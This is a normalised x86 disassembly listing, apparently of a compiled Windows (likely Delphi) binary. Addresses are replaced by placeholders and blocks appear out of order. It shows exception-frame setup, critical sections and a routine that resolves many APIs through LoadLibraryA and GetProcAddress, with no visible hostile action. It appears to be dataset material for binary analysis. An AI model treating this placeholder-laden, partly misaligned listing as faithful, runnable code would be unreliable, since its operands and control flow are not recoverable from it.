lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
mov eax esi
xor edx edx
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403198
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424488
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_425710
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4257f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257fc
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404970
lea eax [ ebp - 0x8 ]
call sub_405634
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424488
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40564c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424488
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40564c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_425818
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425a1d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx ebx
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a24
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
cmp edi 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043a8
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x10 ] esi
inc edi
dec edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
call sub_403198
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_424488
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_403198
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_425a2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425b1f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b26
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404970
lea eax [ ebp - 0x10 ]
call sub_405634
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424488
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_40564c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_425b44
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425c23
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c2a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404970
lea eax [ ebp - 0x8 ]
call sub_405634
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424488
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40564c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405678
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425c44
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4056a8
xor eax eax
push ebp
push sub_425c93
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40564c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c9a
lea eax [ ebx + 0xc ]
call sub_405634
sub_425ca0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_425d35
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f3c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_425a2c
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d3c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
call sub_425540
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_425570
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_425710
sub_425d60
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424488
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424488
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413f38
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424488
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413f38
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413f38
sub_425dec
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_425500
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403198
mov eax [ esi + 0x14 ]
call sub_403198
mov eax [ esi + 0x10 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405634
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_425e40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425e77
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e7e
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_425e88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425ead
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425eb4
retn
sub_425ec0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425ef1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ef8
retn
mov eax [ rw-data ]
call sub_403198
sub_425f04
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425f38
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425f60
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_4261e2
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426209
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426210
retn
sub_4262f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_426338
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_426390
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4263b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263bc
retn
sub_4263c8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_426380
xor eax eax
push ebp
push sub_42657f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426586
mov eax [ rw-data ]
call sub_426388
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_426588
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_426380
xor eax eax
push ebp
push sub_42693b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426942
mov eax [ rw-data ]
call sub_426388
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426cec
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426d14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d5c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d63
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403198
call sub_4263c8
cmp [ rw-data ] 0x0
jg r-xdata
sub_426d84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426da9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426db0
retn
sub_426dbc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426de1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426de8
retn
sub_426df4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e20
retn
sub_426e2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e58
retn
sub_426e64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e90
retn
sub_426e9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426ec1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ec8
retn
sub_426f05
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_426f2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f34
retn
sub_426f48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426f6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f74
retn
sub_426f80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426fa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fac
retn
sub_427684
push ebx
push esi
push edi
